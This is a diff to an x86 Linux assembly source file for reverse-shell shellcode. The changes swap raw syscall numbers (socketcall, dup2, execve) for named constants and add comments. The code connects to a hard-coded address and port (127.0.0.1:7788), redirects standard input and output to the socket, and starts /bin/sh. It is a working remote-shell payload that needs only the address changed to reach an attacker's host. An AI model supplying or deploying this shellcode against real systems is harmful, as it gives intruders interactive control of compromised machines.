@@ -3,9 +3,13 @@
 	;; Handy One liner for IP
 	;; reduce(lambda a,b:b+a,(map(lambda a:hex(a)[2:].zfill(2),[int(i) for i in '127.0.0.1'.split('.')])))
 	;; port is littleEndian
-
+%include "../include/short32.s"
+	
 %define IP dword 0x0100007f	;IP 127.0.0.1 Little Endian
 %define PORT word  0x6c1e	;port 7788 Little Endian
+	;; Socketcall is the systemcall we use to manipulate sockets
+	;; It's linux specific. Use man socketcall.
+	;; first argument is an integer and second is an arg struct ptr
 BITS 32
 	global main
 main:
@@ -15,13 +19,13 @@ main:
 	push byte 1
 	push byte 2
 	inc ebx
-	mov al,0x66
+	mov al,socketcall 
 	mov ecx,esp
-	int 0x80
+	int 0x80		;
 
 	mov esi,eax
 	xor eax,eax
-	mov al,0x66
+	mov al,socketcall
 	inc ebx
 IPandPort:	
 	push IP
@@ -41,21 +45,24 @@ IPandPort:
 	mov edx,ecx
 	mov cl,2
 copy:
-	mov al,63		;dup2 63
+	mov al,dup2		;dup2 63
 	int 0x80
 	dec ecx
 	jns copy
-
+	
+	;; Any local shellcode here
+	;; 32bit execve /bin/sh below
+	;; it's usually what you want
 	xor eax,eax
 	push eax
 	push 0x68732f2f
 	push 0x6e69622f
-	mov al,11
+	mov al, execve
 	mov ebx,esp
 	xor ecx,ecx
 	mov edx,ecx
 	int 0x80
 
-	;; Any local shellcode here
+	
 
 	
